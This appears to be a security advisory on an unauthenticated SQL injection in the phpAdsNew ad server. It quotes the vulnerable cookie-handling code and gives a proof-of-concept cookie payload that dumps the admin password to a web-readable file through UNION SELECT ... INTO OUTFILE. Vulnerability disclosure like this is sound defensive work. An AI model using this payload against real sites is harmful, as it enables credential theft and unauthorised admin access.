Background (from their web site)
----------
phpAdsNew is an open-source ad server, with an integrated banner
management interface and tracking system for gathering statistics.
With phpAdsNew you can easily rotate paid banners and your own
in-house advertisements. You can even integrate banners from third
party advertising companies.

Details
--------
Toni Koivunen has published an advisory yesterday regarding a
vulnerability exploitable via /admin/logout.php, that can be used to
delete arbitrary data (maybe more). However more sql injections are
present in this part of the code, all the functions in
/admin/lib-sessions.inc.php do not check the "sessionID" variable
coming from the cookie, the most interesting is
phpAds_SessionDataFetch() because it is called in config.php and makes
a simple SELECT query.

Snip:
[no previous check]
       if (isset($HTTP_COOKIE_VARS['sessionID']) &&
$HTTP_COOKIE_VARS['sessionID'] != '')
        {
$result = phpAds_dbQuery("SELECT sessiondata FROM
".$phpAds_config['tbl_session']." WHERE
sessionid='".$HTTP_COOKIE_VARS['sessionID']."'" .
" AND UNIX_TIMESTAMP(NOW())-UNIX_TIMESTAMP(lastused) < 3600"); <-- ouch

Since /admin/config.php is included in /admin/index.php, we don't need
to be authenticated to exploit the vulnerability.

PoC (cookie):
sessionID=adsds'/**/UNION/**/SELECT admin_pw from phpads_config into
outfile "/var/www/blah.txt"/*;

Just "exploit" one of the many errors in the pages to get the path and
here you go, open /admin/index.php with that as cookie.

Solution
---------
No patch.

Filter the variable in the affected functions.
